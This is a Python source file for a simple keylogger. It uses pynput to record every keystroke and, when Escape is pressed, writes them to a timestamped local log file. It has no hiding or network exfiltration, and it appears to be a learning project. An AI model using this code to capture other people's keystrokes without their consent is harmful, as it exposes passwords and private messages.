# Importing Libraries and Utilities
from pynput.keyboard import Key, Listener
from Utility import checkLogDir, checkFileSize, logFormatterString, currentLocalTime
import re


# Class for Keyboard Logger
class keyBoardLogger:

    # Class variables
    __count, __keys = 0, []

    # Default Constructor
    def __init__(self):
        pass

    # Method `onPress`
    """
        Record the Key Pressings
    """
    @classmethod
    def __onPress(cls, key):

        # Appending Keys and Changing the Count
        cls.__keys.append(key)
        cls.__count += 1

    # Method `onRelease`
    """
        Close the Session when Pressed Escape.
    """
    @staticmethod
    def __onRelease(key):
        if key == Key.esc:
            keyBoardLogger.__writeFile()
            return False

    # Method `writeFile`
    """
        Recording Logs in Log Files
    """
    @classmethod
    def __writeFile(cls):

        ## Checking if Log Directory Exists or Not
        checkLogDir()

        ## Naming the Log File and doing Appropriate Checks
        timeForFile = str(currentLocalTime).replace(":", "_")
        filePath = f"Logs\\KeyBoardLog {str(timeForFile)}.txt"
        with open(filePath, "w") as f:
            fileSize = checkFileSize(filePath)
            if fileSize >= (10 ** 5):    # 100 KB
                cls.__writeFile()
            else:
                f.write(logFormatterString.format(timeLog = currentLocalTime, logerType = "KeyBoard"))
                f.write("\n\t")
                for key in cls.__keys:
                    k = str(key).replace("'", "")
                    if k.find("Key") == 0:
                        f.write(f"[{k.split('Key.')[-1].upper()}]")
                    elif len(re.findall("\\d{2}", k)) > 0:
                        f.write("[HOT-KEY]")
                    else:
                        f.write(k)
                finalText = f"\n\nTotal Key Presses: {cls.__count}"
                f.write(finalText)

    # Method `runKeyBoardLogger`
    """
        Main Driver Code for Listener and Release
    """
    @classmethod
    def runKeyBoardLogger(cls):
        with Listener(on_press = cls.__onPress, on_release = cls.__onRelease) as listener:
            listener.join()



